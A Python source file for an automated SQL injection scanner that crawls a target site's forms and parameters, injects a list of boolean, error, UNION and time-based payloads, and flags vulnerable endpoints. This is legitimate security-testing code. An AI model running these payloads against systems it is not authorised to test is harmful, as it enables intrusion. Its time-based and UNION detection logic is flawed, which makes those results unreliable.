import re
import urllib.parse
import logging
import requests
import time
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any, List, Optional, Set, Tuple
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException, WebDriverException

from app.scanners.base_scanner import BaseScanner
from app.utils.browser_manager import browser_manager


class SQLiScanner(BaseScanner):
    """
    Scanner to detect SQL Injection vulnerabilities
    """

    name = "SQLi Scanner"
    description = "Detects SQL Injection vulnerabilities in web applications"

    # SQL Injection payloads
    PAYLOADS = [
        # Boolean-based blind
        "' OR '1'='1",
        '" OR "1"="1',
        "') OR ('1'='1",
        '") OR ("1"="1',
        "1' OR '1'='1' --",
        '1" OR "1"="1" --',
        # Error-based
        "'",
        '"',
        "\\",
        "';",
        '";',
        "--",
        "#",
        "1'",
        '1"',
        "1=1'--",
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR 1=1#",
        '" OR 1=1#',
        # UNION-based
        "' UNION SELECT 1,2,3-- -",
        '" UNION SELECT 1,2,3-- -',
        "' UNION SELECT 1,2,3,4-- -",
        '" UNION SELECT 1,2,3,4-- -',
        "' UNION ALL SELECT 1,2,3,4-- -",
        '" UNION ALL SELECT 1,2,3,4-- -',
        # Time-based
        "'; WAITFOR DELAY '0:0:5'--",
        "\"; WAITFOR DELAY '0:0:5'--",
        "'; SELECT pg_sleep(5)--",
        '"; SELECT pg_sleep(5)--',
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
        '" OR (SELECT * FROM (SELECT(SLEEP(5)))a)-- -',
        "' OR SLEEP(5)#",
        '" OR SLEEP(5)#',
    ]

    # SQL error patterns to detect
    ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysqli?",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        # PostgreSQL
        r"PostgreSQL.*?ERROR",
        r"Warning.*?\\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\\.",
        # MS SQL
        r"Driver.*? SQL[\\-_ ]*Server",
        r"OLE DB.*? SQL Server",
        r"(\\W|\\w)SQL Server.*?Driver",
        r"Warning.*?\\W(mssql|sqlsrv)_",
        r"\\[SQL Server\\]",
        r"Incorrect syntax near",
        # Oracle
        r"\\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite\\.Exception",
        r"System\\.Data\\.SQLite\\.SQLiteException",
        r"Warning.*?\\Wsqlite_",
        r"Warning.*?\\WSQLITE_",
        r"near \".*?\": syntax error",
        # Generic
        r"SQL syntax.*",
        r"Syntax error.*?SQL",
        r"Unclosed quotation mark after the character string",
        r"quoted string not properly terminated",
    ]

    def __init__(self, target_url: str, cookies: Optional[str] = None):
        super().__init__(target_url, cookies)
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        # We'll still keep a requests session for cases where browser navigation isn't ideal
        self.session = requests.Session()
        self.max_threads = (
            5  # Lower thread count for SQLi to avoid overloading the server
        )
        self.vulnerable_endpoints = []
        self.tested_urls = set()
        self.logger = logging.getLogger(__name__)
        self.dbms_info = None
        # Get the shared browser instance
        self.browser = None
        # Injectable targets provided by coordinator
        self.injectable_targets = []

    def scan(self) -> Dict[str, Any]:
        """Implementation of the abstract scan method that calls run"""
        return self.run()

    def _get_browser(self):
        """Get the shared browser instance"""
        if not self.browser:
            self.browser = browser_manager.get_browser()
        return self.browser

    def run(self) -> Dict[str, Any]:
        """Run SQL Injection scan using the injectable targets provided by coordinator"""
        self.progress = 10

        # Set cookies if provided
        if self.cookies:
            self._set_cookies()

        try:
            self.progress = 20

            if self.injectable_targets:
                self.logger.info(f"Using {len(self.injectable_targets)} targets provided by coordinator")
                endpoints = self._prepare_injectable_params()
            else:
                self.logger.info("No targets from coordinator, finding injectable parameters")
                endpoints = self._find_injectable_params()

            self.progress = 30

            if endpoints:
                self._test_parameters(endpoints)

            self.progress = 100
            return {
                "vulnerable_params": self.vulnerable_endpoints,
                "dbms_info": self.dbms_info,
                "payloads_used": self.PAYLOADS,
            }

        except Exception as e:
            self.logger.error(f"Error in SQLi scan: {e}")
            return {
                "error": str(e),
                "vulnerable_params": self.vulnerable_endpoints,
                "dbms_info": self.dbms_info,
                "payloads_used": self.PAYLOADS,
            }

    def _prepare_injectable_params(self) -> List[Dict[str, Any]]:
        """Transform coordinator-provided targets into the format expected by _test_parameters"""
        injectable_params = []

        try:
            for target in self.injectable_targets:
                url = target.get("url", "")
                method = target.get("method", "get").lower()

                # Handle different param formats: list of param names or dict of param values
                params = target.get("params", {})
                if isinstance(params, list):
                    # Convert list of param names to dict with default values
                    param_dict = {}
                    for param_name in params:
                        param_dict[param_name] = "1"  # Default value for testing
                    params = param_dict

                if params:
                    injectable_params.append(
                        {
                            "url": url,
                            "method": method,
                            "params": params,
                            "context": "coordinator",
                        }
                    )

            return injectable_params

        except Exception as e:
            self.logger.error(f"Error preparing injectable parameters: {e}")
            return []

    def _set_cookies(self):
        """Set cookies in both session and browser"""
        if not self.cookies:
            return

        # Set cookies in requests session
        cookie_pairs = self.cookies.split(";")
        for cookie_pair in cookie_pairs:
            if "=" in cookie_pair:
                name, value = cookie_pair.strip().split("=", 1)
                self.session.cookies.set(name, value)

        # Set cookies in browser
        browser = self._get_browser()
        try:
            # Visit the site once to be able to set cookies for the domain
            browser_manager.safe_get(self.target_url)

            for cookie_pair in cookie_pairs:
                if "=" in cookie_pair:
                    name, value = cookie_pair.strip().split("=", 1)
                    browser.add_cookie(
                        {
                            "name": name,
                            "value": value,
                            "domain": urllib.parse.urlparse(self.target_url).netloc,
                        }
                    )
        except Exception as e:
            self.logger.error(f"Error setting browser cookies: {e}")

    def _find_injectable_params(self) -> List[Dict[str, Any]]:
        """Find potential injectable parameters using browser"""
        injectable_params = []

        try:
            # Use browser for more authentic page rendering
            browser = self._get_browser()
            success = browser_manager.safe_get(self.target_url)

            if not success:
                self.logger.warning(
                    f"Failed to load {self.target_url} in browser, falling back to requests"
                )
                # Fallback to requests
                response = self.session.get(
                    self.target_url, headers=self.headers, timeout=10
                )

                if response.status_code != 200:
                    return []

                html_content = response.text
            else:
                html_content = browser.page_source

            soup = BeautifulSoup(html_content, "html.parser")

            # Find forms
            for form in soup.find_all("form"):
                form_action = form.get("action", "")
                form_method = form.get("method", "get").lower()
                form_url = urllib.parse.urljoin(self.target_url, form_action)

                inputs = {}
                for input_tag in form.find_all(["input", "textarea", "select"]):
                    input_name = input_tag.get("name")
                    if input_name:
                        inputs[input_name] = input_tag.get("value", "")

                if inputs:
                    injectable_params.append(
                        {
                            "url": form_url,
                            "method": form_method,
                            "params": inputs,
                            "context": "form",
                        }
                    )

            # Find URLs with query parameters
            parsed_url = urllib.parse.urlparse(self.target_url)
            if parsed_url.query:
                query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
                injectable_params.append(
                    {
                        "url": parsed_url.scheme
                        + "://"
                        + parsed_url.netloc
                        + parsed_url.path,
                        "method": "get",
                        "params": query_params,
                        "context": "url",
                    }
                )

            # Also add common parameter names that might be vulnerable
            common_params = [
                "id",
                "page",
                "user",
                "username",
                "name",
                "category",
                "item",
                "view",
                "product",
                "article",
            ]
            for param in common_params:
                injectable_params.append(
                    {
                        "url": self.target_url,
                        "method": "get",
                        "params": {param: "1"},
                        "context": "common",
                    }
                )

            return injectable_params

        except Exception as e:
            self.logger.error(f"Error finding injectable parameters: {e}")
            return []

    def _test_parameters(self, endpoints: List[Dict[str, Any]]):
        """Test parameters for SQL injection vulnerabilities"""
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []

            for endpoint in endpoints:
                url = endpoint["url"]
                method = endpoint["method"]
                params = endpoint["params"]

                for param_name in params.keys():
                    # First test with normal value to establish baseline
                    baseline_params = params.copy()
                    baseline_params[param_name] = "safe1234"

                    try:
                        if method.lower() == "get":
                            baseline_response = self.session.get(
                                url,
                                params=baseline_params,
                                headers=self.headers,
                                timeout=10,
                            )
                        else:
                            baseline_response = self.session.post(
                                url,
                                data=baseline_params,
                                headers=self.headers,
                                timeout=10,
                            )

                        baseline_content = baseline_response.text
                        baseline_status = baseline_response.status_code
                        baseline_time = time.time()
                        baseline_length = len(baseline_content)
                    except Exception:
                        continue

                    # Now test with each payload
                    for payload in self.PAYLOADS:
                        test_params = params.copy()
                        test_params[param_name] = payload

                        if method.lower() == "get":
                            futures.append(
                                executor.submit(
                                    self._test_get_param,
                                    url,
                                    test_params,
                                    param_name,
                                    payload,
                                    baseline_status,
                                    baseline_content,
                                    baseline_time,
                                    baseline_length,
                                )
                            )
                        elif method.lower() == "post":
                            futures.append(
                                executor.submit(
                                    self._test_post_param,
                                    url,
                                    test_params,
                                    param_name,
                                    payload,
                                    baseline_status,
                                    baseline_content,
                                    baseline_time,
                                    baseline_length,
                                )
                            )

            # Wait for all futures to complete
            completed = 0
            total = len(futures)
            for future in futures:
                future.result()
                completed += 1
                # Update progress
                if total > 0:
                    self.progress = 30 + int(60 * (completed / total))

    def _test_get_param(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        payload: str,
        baseline_status: int,
        baseline_content: str,
        baseline_time: float,
        baseline_length: int,
    ):
        """Test a GET parameter for SQL injection using both browser and requests"""
        try:
            cache_key = f"GET {url} {urllib.parse.urlencode(params)}"

            if cache_key in self.tested_urls:
                return

            self.tested_urls.add(cache_key)

            # First try with browser for more realistic testing
            browser = self._get_browser()
            try:
                full_url = f"{url}?{urllib.parse.urlencode(params)}"

                start_time = time.time()
                success = browser_manager.safe_get(full_url)
                response_time = time.time() - start_time

                if success:
                    content = browser.page_source
                    status = 200  # Browser doesn't provide status code, assume 200 if page loaded

                    self._analyze_response(
                        {"text": content, "status_code": status},
                        url,
                        "GET",
                        param_name,
                        payload,
                        baseline_status,
                        baseline_content,
                        baseline_time,
                        baseline_length,
                        response_time,
                    )
                    return
            except (TimeoutException, WebDriverException) as e:
                # Check if it's a time-based injection that caused timeout
                if (
                    "WAITFOR DELAY" in payload
                    or "pg_sleep" in payload
                    or "SLEEP" in payload
                ):
                    self._add_vulnerability(
                        url,
                        "GET",
                        param_name,
                        payload,
                        "time-based",
                        "Browser request timed out with time-based payload",
                    )
                    return
                self.logger.debug(
                    f"Browser error for {url}, falling back to requests: {e}"
                )

            # Fall back to requests for reliability
            start_time = time.time()
            response = self.session.get(
                url,
                params=params,
                headers=self.headers,
                timeout=15,  # Longer timeout for time-based SQLi
            )
            response_time = time.time() - start_time

            self._analyze_response(
                response,
                url,
                "GET",
                param_name,
                payload,
                baseline_status,
                baseline_content,
                baseline_time,
                baseline_length,
                response_time,
            )

        except requests.Timeout:
            # Timeout could indicate a successful time-based injection
            if (
                "WAITFOR DELAY" in payload
                or "pg_sleep" in payload
                or "SLEEP" in payload
            ):
                self._add_vulnerability(
                    url,
                    "GET",
                    param_name,
                    payload,
                    "time-based",
                    "Request timed out with time-based payload",
                )

        except Exception as e:
            self.logger.debug(f"Error testing GET parameter {url}, {param_name}: {e}")

    def _test_post_param(
        self,
        url: str,
        data: Dict[str, str],
        param_name: str,
        payload: str,
        baseline_status: int,
        baseline_content: str,
        baseline_time: float,
        baseline_length: int,
    ):
        """Test a POST parameter for SQL injection using both browser and requests"""
        try:
            cache_key = f"POST {url} {urllib.parse.urlencode(data)}"

            if cache_key in self.tested_urls:
                return

            self.tested_urls.add(cache_key)

            # First try with browser for more realistic testing
            browser = self._get_browser()
            try:
                # Navigate to the page containing the form
                browser_manager.safe_get(url)

                # Attempt to fill out the form
                try:
                    for field_name, field_value in data.items():
                        # Try to find and fill the input field
                        try:
                            input_field = browser.find_element(By.NAME, field_name)
                            input_field.clear()
                            input_field.send_keys(field_value)
                        except Exception as e:
                            self.logger.debug(f"Could not fill field {field_name}: {e}")

                    # Try to submit the form
                    forms = browser.find_elements(By.TAG_NAME, "form")
                    start_time = time.time()
                    if forms:
                        forms[0].submit()
                        response_time = time.time() - start_time
                        content = browser.page_source
                        status = 200  # Assume 200 if successful

                        self._analyze_response(
                            {"text": content, "status_code": status},
                            url,
                            "POST",
                            param_name,
                            payload,
                            baseline_status,
                            baseline_content,
                            baseline_time,
                            baseline_length,
                            response_time,
                        )
                        return
                except Exception as form_ex:
                    self.logger.debug(f"Error submitting form in browser: {form_ex}")
            except (TimeoutException, WebDriverException) as e:
                # Check if it's a time-based injection that caused timeout
                if (
                    "WAITFOR DELAY" in payload
                    or "pg_sleep" in payload
                    or "SLEEP" in payload
                ):
                    self._add_vulnerability(
                        url,
                        "POST",
                        param_name,
                        payload,
                        "time-based",
                        "Browser request timed out with time-based payload",
                    )
                    return
                self.logger.debug(
                    f"Browser error for POST to {url}, falling back to requests: {e}"
                )

            # Fall back to requests for reliability
            start_time = time.time()
            response = self.session.post(
                url,
                data=data,
                headers=self.headers,
                timeout=15,  # Longer timeout for time-based SQLi
            )
            response_time = time.time() - start_time

            self._analyze_response(
                response,
                url,
                "POST",
                param_name,
                payload,
                baseline_status,
                baseline_content,
                baseline_time,
                baseline_length,
                response_time,
            )

        except requests.Timeout:
            # Timeout could indicate a successful time-based injection
            if (
                "WAITFOR DELAY" in payload
                or "pg_sleep" in payload
                or "SLEEP" in payload
            ):
                self._add_vulnerability(
                    url,
                    "POST",
                    param_name,
                    payload,
                    "time-based",
                    "Request timed out with time-based payload",
                )

        except Exception as e:
            self.logger.debug(f"Error testing POST parameter {url}, {param_name}: {e}")

    def _analyze_response(
        self,
        response,
        url: str,
        method: str,
        param_name: str,
        payload: str,
        baseline_status: int,
        baseline_content: str,
        baseline_time: float,
        baseline_length: int,
        response_time: float,
    ):
        """Analyze response for SQL injection vulnerabilities"""
        try:
            # Handle both requests Response objects and our custom dict format from browser tests
            if hasattr(response, "text"):
                content = response.text
                status = response.status_code
            else:
                content = response["text"]
                status = response["status_code"]

            # Check for SQL errors in response
            for pattern in self.ERROR_PATTERNS:
                if re.search(pattern, content, re.IGNORECASE) and not re.search(
                    pattern, baseline_content, re.IGNORECASE
                ):
                    db_type = self._determine_db_type(pattern, content)
                    self.dbms_info = db_type
                    self._add_vulnerability(
                        url,
                        method,
                        param_name,
                        payload,
                        "error-based",
                        f"SQL error detected: {db_type}",
                    )
                    return

            # Check for boolean-based injections (significant change in response)
            if ("OR" in payload or "or" in payload) and (
                "1=1" in payload or "'1'='1'" in payload or '"1"="1"' in payload
            ):
                # If response is significantly different (status change or content length change > 20%)
                content_diff_ratio = abs(len(content) - baseline_length) / max(
                    baseline_length, 1
                )
                if status != baseline_status or content_diff_ratio > 0.2:
                    self._add_vulnerability(
                        url,
                        method,
                        param_name,
                        payload,
                        "boolean-based",
                        "Response changed significantly with boolean-based payload",
                    )
                    return

            # Check for time-based injections
            if (
                "WAITFOR DELAY" in payload
                or "pg_sleep" in payload
                or "SLEEP" in payload
            ):
                # If response time is significantly longer (3+ seconds)
                if response_time > baseline_time + 3.0:
                    self._add_vulnerability(
                        url,
                        method,
                        param_name,
                        payload,
                        "time-based",
                        f"Response time increased by {response_time - baseline_time:.2f} seconds",
                    )
                    return

            # Check for UNION-based injections
            if "UNION SELECT" in payload:
                # Look for patterns that might indicate a successful UNION injection
                # For example, numbers from the UNION SELECT showing up in the response
                union_pattern = re.compile(
                    r"(data-sql-)?([0-9]+)(</[a-z]+>)?", re.IGNORECASE
                )
                baseline_matches = set(re.findall(union_pattern, baseline_content))
                response_matches = set(re.findall(union_pattern, content))

                # If we find new matches that weren't in the baseline
                new_matches = response_matches - baseline_matches
                if new_matches:
                    self._add_vulnerability(
                        url,
                        method,
                        param_name,
                        payload,
                        "union-based",
                        f"UNION-based injection detected with new data: {new_matches}",
                    )
                    return

        except Exception as e:
            self.logger.debug(f"Error analyzing response: {e}")

    def _determine_db_type(self, pattern: str, content: str) -> str:
        """Determine the database type from error messages"""
        pattern_lower = pattern.lower()

        if "mysql" in pattern_lower:
            return "MySQL"
        elif "postgres" in pattern_lower:
            return "PostgreSQL"
        elif "sqlserver" in pattern_lower or "mssql" in pattern_lower:
            return "Microsoft SQL Server"
        elif "ora-" in pattern_lower:
            return "Oracle"
        elif "sqlite" in pattern_lower:
            return "SQLite"

        # If pattern doesn't clearly indicate DB type, try to determine from content
        content_lower = content.lower()
        if "mysql" in content_lower:
            return "MySQL"
        elif "postgresql" in content_lower or "postgres" in content_lower:
            return "PostgreSQL"
        elif "microsoft sql server" in content_lower or "sqlserver" in content_lower:
            return "Microsoft SQL Server"
        elif "ora-" in content_lower or "oracle" in content_lower:
            return "Oracle"
        elif "sqlite" in content_lower:
            return "SQLite"

        return "Unknown Database"

    def _add_vulnerability(
        self,
        url: str,
        method: str,
        param_name: str,
        payload: str,
        injection_type: str,
        details: str,
    ):
        """Add a vulnerability to the list if not already present"""
        # Check if we already have this vulnerability
        for vuln in self.vulnerable_endpoints:
            if vuln["url"] == url and vuln["parameter"] == param_name:
                return

        # Add new vulnerability
        vulnerability = {
            "url": url,
            "method": method,
            "parameter": param_name,
            "payload": payload,
            "type": injection_type,
            "details": details,
        }

        self.vulnerable_endpoints.append(vulnerability)
        self.logger.warning(
            f"Found SQL Injection vulnerability: {url}, parameter: {param_name}, type: {injection_type}"
        )
